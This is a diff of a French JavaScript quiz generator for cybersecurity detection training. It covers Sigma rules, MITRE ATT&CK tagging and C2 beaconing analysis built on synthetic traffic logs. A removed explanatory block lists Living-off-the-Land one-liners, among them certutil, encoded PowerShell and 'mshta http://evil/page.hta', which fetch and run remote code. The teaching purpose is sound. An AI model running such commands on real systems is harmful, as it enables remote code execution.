-        choices,
-        hintFn: () => `sigma-cli (officiel, Python). Commande : <code>sigma convert -t splunk rule.yml</code>. Cibles : splunk, esql/eql (Elastic), kql (Sentinel), grep, AWS, GCP. Alternative pour live EVTX : chainsaw (WithSecure, Rust).`
+        badge: 'extraction',
+        artefactHTML,
+        question: `La règle a son <code>EventID</code> manquant. En te basant sur la <code>description</code>, <strong>quel Event ID Windows Security</strong> faut-il mettre ?`,
+        inputLabel: 'EventID :',
+        placeholder: '4624',
+        expected: String(evt.id),
+        normalize: v => v.trim().replace(/[^\d]/g, ''),
+        hints: [
+          `Les Event IDs Security Windows les plus courants : 4624 (logon réussi), 4625 (logon échoué), 4634 (logoff), 4648 (logon explicite), 4672 (privilèges spéciaux), 4688 (process create), 4720 (user créé), 4732 (ajout groupe).`,
+          `Description : "${evt.what}". Cherche dans la liste celui qui correspond exactement.`,
+          `EventID = <strong>${evt.id}</strong> (= ${evt.what.split('—')[0].trim()}).`
+        ],
+        explain: `<strong>EventID: ${evt.id}</strong> — ${evt.what}. Source : journal <code>Security</code> sur Windows. Visualisable avec <code>Get-WinEvent -LogName Security -FilterHashtable @{Id=${evt.id}}</code> en PowerShell.`
       });
     }
 
-    // qType === 6 : MITRE ATT&CK dans Sigma
-    const choices = [
-      { text: 'Champ <code>tags:</code> avec convention <code>attack.txxxx</code> (technique) et <code>attack.&lt;tactic&gt;</code>', correct: true,
-        explain: `Sigma encourage le tagging avec MITRE ATT&CK. Format : <code>tags:<br>  - attack.t1059.001  # PowerShell<br>  - attack.execution<br>  - attack.persistence</code>. Permet de croiser la couverture détection avec la matrice ATT&CK (heatmap dans ATT&CK Navigator). Standard adopté par tout l'écosystème (SigmaHQ, Elastic Detection Rules, Sentinel Analytics Rules).` },
-      { text: 'Champ <code>mitre:</code> avec liste de techniques', correct: false,
-        explain: `Pas la convention. C'est <code>tags:</code> avec préfixe <code>attack.</code> (txxxx pour techniques, mot pour tactique).` },
-      { text: 'Pas de support natif, à mettre en commentaire', correct: false,
-        explain: `Faux : Sigma supporte explicitement les tags ATT&CK depuis ses débuts.` },
-      { text: 'Champ <code>ttp:</code>', correct: false,
-        explain: `Pas le nom du champ standard. C'est <code>tags:</code> avec <code>attack.</code>.` },
-    ].sort(() => Math.random() - 0.5);
-    return buildQCMCard({
-      ...opts,
-      scenario: `Comment référencer une <strong>technique MITRE ATT&amp;CK</strong> dans une règle Sigma ?`,
-      choices,
-      hintFn: () => `Champ <code>tags:</code> avec <code>attack.txxxx</code> (technique, ex: attack.t1059.001 = PowerShell) + <code>attack.&lt;tactic&gt;</code> (ex: attack.execution). Permet de mesurer la couverture détection vs ATT&CK Navigator.`
-    });
+    // ── Niveau C : technique MITRE ATT&CK à compléter ──
+    {
+      const techniques = [
+        { id: 't1059.001', name: 'PowerShell', desc: 'Detects suspicious PowerShell command (EncodedCommand, IEX, DownloadString)' },
+        { id: 't1003.001', name: 'LSASS Memory', desc: 'Detects access to LSASS process memory (credential dumping via Mimikatz, ProcDump)' },
+        { id: 't1547.001', name: 'Registry Run Keys', desc: 'Detects new entries in Run/RunOnce registry keys (persistence)' },
+        { id: 't1218.011', name: 'Rundll32', desc: 'Detects suspicious rundll32.exe usage (signed binary proxy execution)' },
+        { id: 't1053.005', name: 'Scheduled Task', desc: 'Detects scheduled task creation with schtasks.exe (persistence/execution)' },
+        { id: 't1071.001', name: 'Web Protocols', desc: 'Detects HTTP/HTTPS traffic to known C2 infrastructure (command and control)' }
+      ];
+      const t = techniques[rand(0, techniques.length - 1)];
+      const yaml = `title: ${t.name} suspicious activity
+description: ${t.desc}
+logsource:
+  product: windows
+  service: sysmon
+detection:
+  selection:
+    EventID: 1
+    Image|endswith: '\\powershell.exe'
+  condition: selection
+tags:
+  - attack.???
+  - attack.execution
+level: high`;
+
+      const artefactHTML = renderTextBlock(yaml, {
+        title: 'Règle Sigma — détection.yml',
+        highlights: [
+          { match: 'description:', color: '--purple' },
+          { match: 'attack.???', color: '--purple' },
+          { match: 'title:', color: '--purple' }
+        ]
+      });
+
+      return buildPracticeCard({
+        ...opts,
+        badge: 'identification',
+        artefactHTML,
+        question: `La règle a son tag MITRE ATT&CK incomplet (<code>attack.???</code>). En te basant sur le <code>title</code> et la <code>description</code>, <strong>quel identifiant de technique MITRE</strong> faut-il mettre ?<br><span style="color:var(--dim);font-size:.85rem">Format : <code>tXXXX</code> ou <code>tXXXX.YYY</code> (minuscules, sans préfixe attack.)</span>`,
+        inputLabel: 'Technique :',
+        placeholder: 't1059.001',
+        expected: t.id,
+        normalize: v => v.trim().toLowerCase().replace(/^attack\./, '').replace(/\s/g, ''),
+        hints: [
+          `Le tag MITRE suit le format <code>attack.tXXXX</code> (technique) ou <code>attack.tXXXX.YYY</code> (sous-technique). Cherche dans <a href="https://attack.mitre.org">attack.mitre.org</a> par mot-clé du titre.`,
+          `Title : "${t.name}". C'est une technique nommée dans la matrice ATT&CK Enterprise — pense au domaine concerné (execution, credential access, persistence, etc.).`,
+          `<strong>${t.id}</strong> = ${t.name}. URL : <code>attack.mitre.org/techniques/${t.id.toUpperCase().replace('.', '/')}/</code>`
+        ],
+        explain: `Tag MITRE : <strong>attack.${t.id}</strong> (${t.name}). Bonne pratique Sigma : toujours tagger avec ATT&CK pour mesurer la couverture détection via ATT&CK Navigator (heatmap).`
+      });
+    }
   }
 
   // ════════════════════════════════════════════════════════════════
-  // TP 4 : C2 Frameworks & Post-Exploitation
+  // TP 4 : C2 — Timeline beaconing
   // ════════════════════════════════════════════════════════════════
 
+  function _genBeaconTimeline(opts) {
+    opts = opts || {};
+    const count = opts.count || 5;
+    const sleepSec = opts.sleepSec || 60;
+    const jitterPct = opts.jitterPct || 0;
+    const srcIP = opts.srcIP || '10.10.50.42';
+    const dstIP = opts.dstIP || '185.220.101.42';
+
+    const lines = [];
+    lines.push(`Source : ${srcIP}    Destination : ${dstIP}:443    Protocol : TLS\n`);
+    lines.push('Timestamp                Bytes_out   Bytes_in   Duration');
+    lines.push('────────────────────────────────────────────────────────');
+
+    let t = new Date();
+    t.setSeconds(0, 0);
+    t.setMinutes(rand(0, 59));
+    t.setHours(rand(8, 18));
+
+    for (let i = 0; i < count; i++) {
+      const jitter = jitterPct ? Math.floor(sleepSec * jitterPct / 100 * (Math.random() * 2 - 1)) : 0;
+      const interval = i === 0 ? 0 : sleepSec + jitter;
+      t = new Date(t.getTime() + interval * 1000);
+      const tsStr = t.toISOString().replace('T', ' ').slice(0, 19);
+      const bytesOut = rand(180, 240);
+      const bytesIn = rand(450, 620);
+      const duration = (Math.random() * 0.3 + 0.05).toFixed(2);
+      lines.push(`${tsStr}      ${bytesOut.toString().padStart(4)}        ${bytesIn.toString().padStart(4)}       ${duration}s`);
+    }
+    return lines.join('\n');
+  }
+
   function genC2() {
-    const qType = rand(0, 6);
-    const opts = { prefix: 'c2', icon: '🎯', title: 'C2 Frameworks & Post-Exploitation', badge: 'attack' };
+    const level = rand(0, 2);
+    const opts = { prefix: 'c2', icon: '🎯', title: 'C2 — Analyse de beaconing' };
 
-    if (qType === 0) {
-      // Cobalt Strike concept
-      const choices = [
-        { text: 'Un <strong>framework C2 commercial</strong> (Fortra) — référence des red teams, abusé par les groupes ransomware', correct: true,
-          explain: `<strong>Cobalt Strike</strong> (créé par Raphael Mudge en 2012, racheté par Fortra ex-HelpSystems). Composants :<br>• <strong>Team Server</strong> (serveur C2 Java)<br>• <strong>Aggressor</strong> (client GUI)<br>• <strong>Beacon</strong> (implant, le payload qui tourne sur la cible)<br>Cracké et largement piraté → abusé par Conti, Black Basta, LockBit. Détection : pipes nommés <code>\\\\.\\pipe\\msagent_*</code>, comportement de beaconing, profile Malleable C2 (souvent par défaut → patterns détectables).` },
-        { text: 'Un antivirus de Microsoft', correct: false,
-          explain: `Microsoft Defender. Cobalt Strike est l'inverse — un outil offensif.` },
-        { text: 'Un protocole réseau IETF', correct: false,
-          explain: `C'est un framework logiciel commercial, pas un standard IETF.` },
-        { text: 'Une CA root russe', correct: false,
-          explain: `Pas du tout. Outil offensif commercial (États-Unis).` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+    // ── Niveau A : intervalle moyen entre 2 connexions (sans jitter) ──
+    if (level === 0) {
+      const sleepSec = [30, 60, 90, 120][rand(0, 3)];
+      const timeline = _genBeaconTimeline({ count: 5, sleepSec, jitterPct: 0 });
+
+      const artefactHTML = renderTextBlock(timeline, {
+        title: 'Connexions vers IP externe — extrait Zeek conn.log',
+        highlights: [{ match: '────', color: '--cyan' }]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Qu'est-ce que <strong>Cobalt Strike</strong> ?`,
-        choices,
-        hintFn: () => `Framework C2 commercial (Fortra). Beacon = implant. Team Server = C2. Aggressor = client. Cracké/piraté → utilisé par tous les grands groupes ransomware. Détection forensique = patterns de beaconing, named pipes.`
+        badge: 'lecture',
+        artefactHTML,
+        question: `Voici 5 connexions consécutives d'un poste interne vers une IP externe. <strong>Quel est l'intervalle entre 2 connexions consécutives</strong> (en secondes) ?`,
+        inputLabel: 'Intervalle (s) :',
+        placeholder: '60',
+        expected: String(sleepSec),
+        normalize: v => v.trim().replace(/[^\d]/g, ''),
+        hints: [
+          `Pour calculer l'intervalle : soustraire 2 timestamps consécutifs. Tous les intervalles sont identiques ici (pas de jitter).`,
+          `Compare les timestamps des lignes 1 et 2 (ou 2 et 3). La différence en secondes est constante.`,
+          `Intervalle = <strong>${sleepSec} secondes</strong>. Pattern de beaconing classique — une connexion toutes les ${sleepSec}s, taille constante des paquets.`
+        ],
+        explain: `Intervalle = <strong>${sleepSec}s</strong>. Régularité absolue + tailles de paquets stables = signature de beacon C2. Détection : <code>rita</code> (Active Countermeasures), <code>capa</code>, ou analyse statistique des intervalles dans Zeek.`
       });
     }
 
-    if (qType === 1) {
-      // Beaconing
-      const sleep = [60, 90, 120, 300][rand(0, 3)];
-      const jitter = [10, 20, 30, 50][rand(0, 3)];
-      const jitterPct = jitter / 100;
-      const minDelay = Math.floor(sleep * (1 - jitterPct));
-      const maxDelay = Math.floor(sleep * (1 + jitterPct));
-      const correct = `Entre ${minDelay} et ${maxDelay} secondes`;
-      const distractors = [
-        `Exactement toutes les ${sleep} secondes`,
-        `Entre 0 et ${sleep * 2} secondes`,
-        `Toutes les ${jitter} secondes`,
+    // ── Niveau B : extraire le sleep central avec jitter ──
+    if (level === 1) {
+      const sleepSec = [60, 90, 120][rand(0, 2)];
+      const jitterPct = [10, 20, 30][rand(0, 2)];
+      const timeline = _genBeaconTimeline({ count: 6, sleepSec, jitterPct });
+
+      const artefactHTML = renderTextBlock(timeline, {
+        title: 'Connexions périodiques — analyse forensique',
+        highlights: [{ match: '────', color: '--gold' }]
+      });
+
+      return buildPracticeCard({
+        ...opts,
+        badge: 'calcul',
+        artefactHTML,
+        question: `Cette fois les intervalles varient — le beacon utilise du jitter. Les intervalles oscillent autour d'une valeur centrale (le <code>sleep</code> configuré). <strong>Quel est ce sleep central</strong> (en secondes, arrondi au plus proche multiple de 10) ?<br><span style="color:var(--dim);font-size:.85rem">Astuce : calcule la moyenne des intervalles, puis arrondis.</span>`,
+        inputLabel: 'Sleep (s) :',
+        placeholder: '60',
+        expected: String(sleepSec),
+        normalize: v => v.trim().replace(/[^\d]/g, ''),
+        hints: [
+          `Calcule chaque intervalle entre 2 lignes consécutives, fais la moyenne, et arrondis au multiple de 10 le plus proche. La moyenne convergera vers le sleep configuré (en théorie de probabilités : la valeur attendue d'un uniforme [s-j, s+j] est s).`,
+          `Avec un jitter de ±${jitterPct}%, les intervalles oscillent entre ${Math.floor(sleepSec*(1-jitterPct/100))} et ${Math.floor(sleepSec*(1+jitterPct/100))} secondes. Le sleep central est au milieu.`,
+          `Sleep configuré = <strong>${sleepSec}s</strong> avec jitter ±${jitterPct}%. Détection : RITA mesure le coefficient de variation et identifie le beacon malgré le jitter.`
+        ],
+        explain: `Sleep = <strong>${sleepSec}s</strong>, jitter = ±${jitterPct}%. Le jitter rend la détection naïve (intervalle fixe) inefficace, mais l'analyse statistique des intervalles reste robuste. Cobalt Strike, Sliver, Mythic permettent tous de configurer sleep+jitter dans leur profil Malleable C2.`
+      });
+    }
+
+    // ── Niveau C : identifier le type de trafic (beaconing) ──
+    {
+      const scenarios = [
+        {
+          sleepSec: 60,
+          jitterPct: 0,
+          label: 'beaconing',
+          aliases: ['beaconing', 'beacon', 'c2 beaconing', 'periodic c2'],
+          desc: 'Intervalle constant + tailles de paquets fixes + IP externe peu connue → C2 beaconing certain.'
+        },
+        {
+          sleepSec: 1,
+          jitterPct: 100,
+          label: 'normal',
+          aliases: ['normal', 'legitimate', 'browsing', 'web browsing', 'légitime'],
+          desc: 'Intervalles aléatoires + tailles très variables = navigation web humaine ordinaire.'
+        },
+        {
+          sleepSec: 0.3,
+          jitterPct: 0,
+          label: 'streaming',
+          aliases: ['streaming', 'video', 'flux'],
+          desc: 'Très haute fréquence + paquets gros (vidéo) = flux streaming (YouTube, Netflix, Twitch).'
+        }
       ];
-      const choices = [
-        { text: correct, correct: true,
-          explain: `Sleep ${sleep}s + jitter ${jitter}% → intervalle entre <strong>${minDelay}s</strong> (${sleep} − ${jitter}%) et <strong>${maxDelay}s</strong> (${sleep} + ${jitter}%). Le jitter rend la périodicité moins détectable. Détection beaconing : analyse statistique des intervalles (RITA, Zeek), entropie des destinations.` },
-        ...distractors.map(d => ({ text: d, correct: false,
-          explain: `Faux. Le jitter ajoute une variation autour de sleep, pas la valeur sleep elle-même ni de 0 à 2×sleep.` }))
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
+      const s = scenarios[rand(0, scenarios.length - 1)];
+
+      // Pour le scénario streaming/normal, on génère un timeline différent
+      let timeline;
+      if (s.label === 'beaconing') {
+        timeline = _genBeaconTimeline({ count: 6, sleepSec: 60, jitterPct: 0 });
+      } else if (s.label === 'normal') {
+        // intervalles très variables, tailles variables
+        const lines = [];
+        lines.push('Source : 10.10.50.42    Destination : variable    Protocol : HTTPS\n');
+        lines.push('Timestamp                Bytes_out   Bytes_in   Duration   Dst_host');
+        lines.push('────────────────────────────────────────────────────────────────────');
+        const hosts = ['www.20min.ch', 'fonts.googleapis.com', 'cdn.jsdelivr.net', 'api.weather.com', 'images.unsplash.com', 'analytics.google.com'];
+        let t = new Date(); t.setHours(14, 0, 0, 0);
+        for (let i = 0; i < 6; i++) {
+          t = new Date(t.getTime() + rand(2, 90) * 1000);
+          const tsStr = t.toISOString().replace('T', ' ').slice(0, 19);
+          const bo = rand(200, 1500); const bi = rand(500, 80000);
+          lines.push(`${tsStr}      ${bo.toString().padStart(4)}      ${bi.toString().padStart(6)}      ${(Math.random()*2).toFixed(2)}s   ${hosts[rand(0,hosts.length-1)]}`);
+        }
+        timeline = lines.join('\n');
+      } else { // streaming
+        const lines = [];
+        lines.push('Source : 10.10.50.42    Destination : 142.250.74.46:443 (youtube.com)    Protocol : HTTPS/QUIC\n');
+        lines.push('Timestamp                Bytes_out   Bytes_in   Duration');
+        lines.push('────────────────────────────────────────────────────────');
+        let t = new Date(); t.setHours(20, 30, 0, 0);
+        for (let i = 0; i < 6; i++) {
+          t = new Date(t.getTime() + rand(100, 500));
+          const ms = t.toISOString().replace('T', ' ').slice(0, 19) + '.' + String(t.getMilliseconds()).padStart(3,'0');
+          const bo = rand(100, 300); const bi = rand(50000, 250000);
+          lines.push(`${ms}    ${bo.toString().padStart(4)}      ${bi.toString().padStart(6)}      0.05s`);
+        }
+        timeline = lines.join('\n');
+      }
+
+      const artefactHTML = renderTextBlock(timeline, {
+        title: 'Trafic réseau — analyse de pattern',
+        highlights: [{ match: '────', color: '--purple' }]
+      });
+
+      return buildPracticeCard({
         ...opts,
-        scenario: `Un beacon Cobalt Strike est configuré avec <code>sleep = ${sleep}s</code> et <code>jitter = ${jitter}%</code>. À quel intervalle check-in-t-il vers le C2 ?`,
-        choices,
-        hintFn: () => `Jitter J% appliqué sur sleep S : intervalle uniforme entre S(1-J/100) et S(1+J/100). Exemple : sleep 60 + jitter 30% → 42-78s. Détection : analyse statistique (RITA, Zeek), entropie domains, durée connexions.`
+        badge: 'identification',
+        artefactHTML,
+        question: `Analyse ce trafic réseau. Considère la <strong>régularité des intervalles</strong>, la <strong>taille des paquets</strong>, et la <strong>destination</strong>. <strong>Quel type de trafic</strong> est-ce ?<br><span style="color:var(--dim);font-size:.85rem">Réponse attendue parmi : <code>beaconing</code>, <code>normal</code>, <code>streaming</code></span>`,
+        inputLabel: 'Type :',
+        placeholder: 'beaconing',
+        expected: s.label,
+        normalize: v => {
+          const norm = v.trim().toLowerCase().replace(/[éè]/g, 'e').replace(/[\s_-]/g, '');
+          for (const alias of s.aliases) {
+            const aliasNorm = alias.toLowerCase().replace(/[éè]/g, 'e').replace(/[\s_-]/g, '');
+            if (norm === aliasNorm) return s.label;
+          }
+          return norm;
+        },
+        hints: [
+          `Le trafic légitime humain (web browsing) a des intervalles très variables et des destinations multiples. Le streaming a une seule destination + gros bytes_in. Le beaconing C2 a un intervalle régulier + petits paquets + une destination peu connue.`,
+          `Observe : ${s.label === 'beaconing' ? 'intervalle constant ~60s, tailles fixes, une seule destination externe' : s.label === 'normal' ? 'intervalles très variables (de 2s à 90s), tailles très variables, destinations multiples' : 'très haute fréquence (<1s), gros paquets entrants (vidéo), une seule destination (YouTube)'}.`,
+          `Pattern = <strong>${s.label}</strong>. ${s.desc}`
+        ],
+        explain: `Trafic <strong>${s.label}</strong>. ${s.desc} Les outils de détection beaconing (RITA, Zeek, suricata) utilisent ces critères : régularité (coefficient de variation), entropie des destinations, ratio bytes_out/in.`
       });
     }
-
-    if (qType === 2) {
-      // Pipe nommé Cobalt Strike
-      const choices = [
-        { text: '<code>\\\\.\\pipe\\msagent_*</code> — pipe par défaut de Cobalt Strike, souvent détecté par Sigma/EDR', correct: true,
-          explain: `Cobalt Strike utilise par défaut le nom de pipe <code>\\\\.\\pipe\\msagent_XXXX</code> (4 chars random). Pattern bien connu, détecté par les EDR. Les opérateurs avancés changent ce nom dans le Malleable C2 profile (option <code>set_pipename</code>). Reste un indicateur précieux : Sysmon Event 17 (PipeCreated) sur <code>msagent_*</code> = suspicion immédiate de Cobalt Strike.` },
-        { text: '<code>\\\\.\\pipe\\spoolsv</code> — pipe légitime du Print Spooler', correct: false,
-          explain: `spoolsv est légitime (Windows Print Spooler). Cobalt Strike pourrait l'imiter mais ce n'est pas son défaut.` },
-        { text: '<code>\\\\.\\pipe\\samr</code> — accès SAM Windows', correct: false,
-          explain: `Pipe SAM = légitime. Pas Cobalt Strike.` },
-        { text: '<code>\\\\.\\pipe\\rpc_control</code>', correct: false,
-          explain: `Pipe RPC légitime Windows, pas Cobalt Strike.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quel pattern de <strong>named pipe</strong> est un indicateur classique de Cobalt Strike ?`,
-        choices,
-        hintFn: () => `\\\\.\\pipe\\msagent_XXXX (4 chars random) = défaut Cobalt Strike. Sysmon Event 17 (PipeCreated) sur ce pattern = forte suspicion. Les opérateurs avertis customisent via Malleable C2 (set_pipename).`
-      });
-    }
-
-    if (qType === 3) {
-      // Frameworks alternatifs
-      const choices = [
-        { text: '<strong>Sliver</strong> (BishopFox, 2020), <strong>Mythic</strong> (SpecterOps), <strong>Havoc</strong> — open source en Go/Python', correct: true,
-          explain: `Alternatives modernes à Cobalt Strike :<br>• <strong>Sliver</strong> (BishopFox, en Go) — multi-plateforme, mTLS, gRPC<br>• <strong>Mythic</strong> (SpecterOps, Python/Docker) — architecture modulaire avec "agents" écrits dans des langages variés<br>• <strong>Havoc</strong> (C5pider) — interface élégante, payloads en C<br>• <strong>Brute Ratel</strong> (commercial, alternative payante)<br>Les groupes de menace migrent progressivement vers Sliver/Brute Ratel pour échapper aux détections Cobalt Strike.` },
-        { text: 'Pas d\'alternative open source — uniquement Cobalt Strike commercial', correct: false,
-          explain: `Faux. Plusieurs alternatives open source existent et sont matures (Sliver, Mythic, Havoc).` },
-        { text: 'Uniquement Metasploit', correct: false,
-          explain: `Metasploit existe (Rapid7) mais c'est plutôt un framework d'exploitation initiale, pas un C2 post-exploitation pur (bien qu'il ait <code>meterpreter</code>).` },
-        { text: 'PowerShell Empire abandonné depuis 2019', correct: false,
-          explain: `Empire a été abandonné en 2019 puis repris par BC-SECURITY. Toujours utilisé, mais en perte de vitesse vs Sliver/Mythic.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Quels sont les <strong>frameworks C2 open source alternatifs</strong> à Cobalt Strike en 2026 ?`,
-        choices,
-        hintFn: () => `Sliver (BishopFox, Go, mTLS), Mythic (SpecterOps, Python/Docker), Havoc (interface moderne). Commercial alt : Brute Ratel. Empire = repris par BC-SECURITY mais en perte de vitesse. Migration en cours chez les threat actors.`
-      });
-    }
-
-    if (qType === 4) {
-      // Malleable C2
-      const choices = [
-        { text: 'Un fichier de configuration qui <strong>personnalise l\'apparence du trafic</strong> Cobalt Strike (HTTP headers, URIs, jitter)', correct: true,
-          explain: `<strong>Malleable C2 profile</strong> = fichier de config Cobalt Strike qui dicte à quoi ressemble le trafic réseau du beacon. Permet d'imiter du trafic légitime : profile "Amazon", "Microsoft Updates", "jQuery", etc. Influence : <code>set sleeptime</code>, <code>set jitter</code>, <code>http-get { uri "..." }</code>, <code>http-post</code>, <code>set_user-agent</code>, <code>spawnto</code>, <code>process-inject</code>. Détection : reconnaître les profiles publics (par fingerprint des URIs, headers). Projets publics : <code>Malleable-C2-Profiles</code> sur GitHub (rsmudge).` },
-        { text: 'Un nouveau langage de programmation', correct: false,
-          explain: `Pas un langage : c'est un format de configuration spécifique à Cobalt Strike.` },
-        { text: 'Le nom du virus informatique en 2024', correct: false,
-          explain: `Inventé. Malleable C2 est une fonctionnalité Cobalt Strike, pas un malware.` },
-        { text: 'Une CA root utilisée par Cobalt Strike', correct: false,
-          explain: `Sans rapport. Aucune CA root spécifique.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Qu'est-ce qu'un <strong>Malleable C2 profile</strong> ?`,
-        choices,
-        hintFn: () => `Fichier de config Cobalt Strike : personnalise trafic HTTP (URIs, headers, user-agent), jitter, spawnto, injection. Imite du trafic légitime. Profiles publics : github.com/rsmudge/Malleable-C2-Profiles. Détection : fingerprinting des profiles connus.`
-      });
-    }
-
-    if (qType === 5) {
-      // Living off the Land
-      const choices = [
-        { text: 'Utiliser les <strong>binaires natifs Windows</strong> (LOLBAS) pour échapper aux EDR : powershell, certutil, mshta, rundll32, wmic', correct: true,
-          explain: `<strong>Living off the Land</strong> (LOTL) : éviter de déposer du nouveau code en utilisant des outils déjà présents et signés Microsoft. Projet de référence : <strong>LOLBAS</strong> (Living Off The Land Binaries, Scripts, and Libraries) — github.com/LOLBAS-Project/LOLBAS. Exemples classiques :<br>• <code>certutil -urlcache -split -f http://...</code> (download fichier)<br>• <code>powershell -enc &lt;base64&gt;</code> (exec encodé)<br>• <code>mshta http://evil/page.hta</code> (exec HTA distant)<br>• <code>rundll32 url.dll,OpenURL ...</code><br>• <code>wmic process call create ...</code>` },
-        { text: 'Vivre dans une cabane à la campagne', correct: false,
-          explain: `L'expression vient du folklore américain (survivalisme) mais en cyber elle désigne une technique offensive.` },
-        { text: 'Installer un antivirus open source', correct: false,
-          explain: `LOTL est une technique offensive, pas défensive.` },
-        { text: 'Utiliser uniquement des outils sur clé USB', correct: false,
-          explain: `Inverse : LOTL = n'apporter aucun outil, utiliser ceux déjà présents sur le système.` },
-      ].sort(() => Math.random() - 0.5);
-      return buildQCMCard({
-        ...opts,
-        scenario: `Que désigne <strong>Living off the Land</strong> (LOTL) en cyber offensif ?`,
-        choices,
-        hintFn: () => `LOTL = abuser des binaires Windows signés Microsoft (LOLBAS project). powershell, certutil, mshta, rundll32, wmic, regsvr32, bitsadmin. Échappe à la détection signature. Détection moderne : analyse comportementale (EDR) + Sigma sur arguments suspects.`
-      });
-    }
-
-    // qType === 6 : MITRE ATT&CK tactics
-    const tactics = [
-      { id: 'TA0001', name: 'Initial Access', example: 'phishing, exploit public-facing app' },
-      { id: 'TA0002', name: 'Execution', example: 'PowerShell, cmd, WMI' },
-      { id: 'TA0003', name: 'Persistence', example: 'Registry Run keys, scheduled tasks, services' },
-      { id: 'TA0004', name: 'Privilege Escalation', example: 'UAC bypass, token impersonation, exploit kernel' },
-      { id: 'TA0005', name: 'Defense Evasion', example: 'masquerading, obfuscation, disable AV' },
-      { id: 'TA0006', name: 'Credential Access', example: 'Mimikatz, LSASS dump, keylogger' },
-      { id: 'TA0008', name: 'Lateral Movement', example: 'PsExec, RDP, SMB share, pass-the-hash' },
-      { id: 'TA0010', name: 'Exfiltration', example: 'over C2 channel, DNS tunneling, cloud upload' },
-      { id: 'TA0011', name: 'Command and Control', example: 'beaconing, application layer protocol' },
-    ];
-    const target = tactics[rand(0, tactics.length - 1)];
-    const others = tactics.filter(t => t !== target);
-    const distractors = [];
-    while (distractors.length < 3) {
-      distractors.push(others.splice(rand(0, others.length - 1), 1)[0]);
-    }
-    const choices = [
-      { text: target.name, correct: true,
-        explain: `<strong>${target.id} = ${target.name}</strong>. Exemples de techniques : ${target.example}. Consulter <code>attack.mitre.org/tactics/${target.id}/</code> pour la liste complète des techniques affiliées.` },
-      ...distractors.map(d => ({
-        text: d.name, correct: false,
-        explain: `${d.name} = <strong>${d.id}</strong>, pas ${target.id}. (Exemples : ${d.example}.)`
-      }))
-    ].sort(() => Math.random() - 0.5);
-    return buildQCMCard({
-      ...opts,
-      scenario: `Dans la matrice MITRE ATT&amp;CK Enterprise, à quoi correspond la tactique <strong>${target.id}</strong> ?`,
-      choices,
-      hintFn: () => `14 tactiques ATT&CK Enterprise (TA0001-TA0043 avec trous). Mémo : Initial → Execution → Persistence → PrivEsc → Defense Evasion → Credential → Discovery → Lateral → Collection → C2 → Exfil → Impact. Référence : attack.mitre.org.`
-    });
   }
 
   // ════════════════════════════════════════════════════════════════
   // Enregistrement dans GENERATORS
   // ════════════════════════════════════════════════════════════════
   if (typeof window !== 'undefined' && window.GENERATORS) {
-    window.GENERATORS.exif = genEXIF;
+    window.GENERATORS.exif     = genEXIF;
     window.GENERATORS.osintdns = genOSINTDNS;
-    window.GENERATORS.sigma = genSigma;
-    window.GENERATORS.c2 = genC2;
+    window.GENERATORS.sigma    = genSigma;
+    window.GENERATORS.c2       = genC2;
   } else if (typeof GENERATORS !== 'undefined') {
-    GENERATORS.exif = genEXIF;
+    GENERATORS.exif     = genEXIF;
     GENERATORS.osintdns = genOSINTDNS;
-    GENERATORS.sigma = genSigma;
-    GENERATORS.c2 = genC2;
+    GENERATORS.sigma    = genSigma;
+    GENERATORS.c2       = genC2;
   }
 
   if (typeof window !== 'undefined') {
-    window.genEXIF = genEXIF;
+    window.genEXIF     = genEXIF;
     window.genOSINTDNS = genOSINTDNS;
-    window.genSigma = genSigma;
-    window.genC2 = genC2;
+    window.genSigma    = genSigma;
+    window.genC2       = genC2;
   }
 })();
